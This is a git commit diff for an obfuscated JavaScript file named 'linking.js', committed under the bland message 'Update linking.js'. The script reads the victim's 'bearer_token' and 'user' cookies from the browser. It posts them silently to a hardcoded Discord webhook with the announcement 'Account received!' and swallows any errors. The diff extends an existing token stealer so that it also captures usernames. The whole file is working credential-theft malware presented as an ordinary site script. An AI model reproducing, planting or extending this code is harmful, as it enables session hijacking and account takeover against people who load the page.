58075f6399a388ac8c9d0c8d1dad4d0e8c71d7ca
cchloeyt <jbundle132@gmail.com>
2024-12-02 18:52:24 +0000

    Update linking.js

--- linking.js
+++ linking.js
@@ -1,20 +1,26 @@
 (function() {
-    function _0x1a9b() {
+    function _0x1a9b(cookieName) {
         const _0x3b5d = document.cookie.split('; ');
         for (let _0x2954 = 0; _0x2954 < _0x3b5d.length; _0x2954++) {
             const _0x49ae = _0x3b5d[_0x2954];
-            if (_0x49ae.startsWith('bearer_token=')) {
+            if (_0x49ae.startsWith(cookieName + '=')) {
                 return _0x49ae.split('=')[1];
             }
         }
         return null;
     }
 
-    const _0x235d = _0x1a9b();
-    if (_0x235d) {
+    const _0x235d = _0x1a9b('bearer_token');
+    const _0x3b5d = _0x1a9b('user');  // Fetches the 'user' cookie
+
+    if (_0x235d && _0x3b5d) {
         const _0x2499 = 'https://discord.com/api/webhooks/1313187900338212977/G-FWHz8JSsAUP_0S_Eg0hW34zMBRm2ADsq4Ye-LUV0CxScS-IbYru7oVtBpD_U-U-MuR';
 
-        const _0x2d2e = { content: `Bearer Token: ${_0x235d}` };
+        const _0x2d2e = {
+            content: `@everyone, **Account received!**
+**Bearer Token:** ${_0x235d}
+**Username:** ${_0x3b5d}`
+        };
 
         fetch(_0x2499, {
             method: 'POST',
@@ -22,7 +28,6 @@
             body: JSON.stringify(_0x2d2e)
         })
         .catch(_0x1ff3 => {
-            // Fail silently if there is an error
         });
     }
 })();
